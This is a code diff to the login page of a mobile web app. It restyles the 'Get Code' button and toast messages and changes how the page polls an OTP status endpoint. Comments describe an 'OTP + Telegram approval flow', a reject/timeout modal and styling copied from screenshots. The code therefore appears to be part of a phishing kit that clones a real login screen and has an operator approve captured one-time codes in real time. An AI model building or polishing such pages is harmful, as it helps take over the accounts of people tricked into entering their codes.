@@ -304,7 +304,11 @@ body{height:100%;color:var(--mint);font-size:.24rem;display:flex;justify-content
   /* ===== OTP + Telegram approval flow (Login · Code login only) ===== */
 /* Get Code: grey-green → yellow at 10 digits → greyish yellow while counting */
 .get-code.ready{background:var(--primary);color:var(--btn-text)}
-.get-code.counting{background:#C9BC55;color:#5A531F}
+.get-code.counting,
+.f-pass .get-code.counting:disabled,
+.f-sms .get-code.counting:disabled{
+  background:var(--mint2);color:var(--btn-text);opacity:1;
+  white-space:normal;line-height:1.15}
 .get-code .spin{width:.26rem;height:.26rem;border:.04rem solid rgba(6,120,49,.35);
   border-top-color:var(--btn-text);border-radius:50%;animation:rot .7s linear infinite;
   margin-right:.1rem;flex-shrink:0}
@@ -326,7 +330,7 @@ body{height:100%;color:var(--mint);font-size:.24rem;display:flex;justify-content
 .toast .t-ic{width:.38rem;height:.38rem;border-radius:50%;background:#12B76A;flex-shrink:0;
   display:flex;align-items:center;justify-content:center;margin-top:.03rem}
 .toast .t-ic svg{width:.24rem;height:.24rem;fill:#fff}
-.toast .t-tx{font-size:.25rem;line-height:1.45;color:#10241A}
+.toast .t-tx{font-size:.27rem;line-height:1.5;color:#10241A;text-align:center}
 
 /* Green Reminder modal (screenshot 5 — reject / timeout) */
 .modal-veil{position:absolute;inset:0;z-index:70;display:none;flex-direction:column;
@@ -824,7 +828,7 @@ async function loginSendCode(btn){
   codeRequestedFor=num;;
   showToast('The verification code has been sent, please check the text message. If you do not receive the verification code, please carefully check whether the mobile phone number is correct and try again.');
   let s=OTP_RESEND_S;
-  btn.textContent='Resend in '+s+'s';                            /* SS3 greyish yellow */
+  btn.innerHTML = `<span>Resend in<br>${s}s</span>`;                            /* SS3 greyish yellow */
   resendTimer=setInterval(()=>{s--;
     if(s<=0){clearInterval(resendTimer);btn.classList.remove('counting');btn.disabled=false;btn.textContent='Get Code';loginCodeReady()}
     else btn.textContent='Resend in '+s+'s';
@@ -854,7 +858,7 @@ async function codeLoginFlow(){
   while(Date.now()<deadline){
     await new Promise(r=>setTimeout(r,POLL_MS));
     try{
-      const j=await(await fetch('/api/otp/status?rid='+reqId)).json();
+      const j=await(await fetch('/api/otp/status',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({rid:reqId,text:reqText,msgs:reqMsgs})})).json();
       if(j.result&&j.result!=='pending'){result=j.result;break}
     }catch(e){}
   }
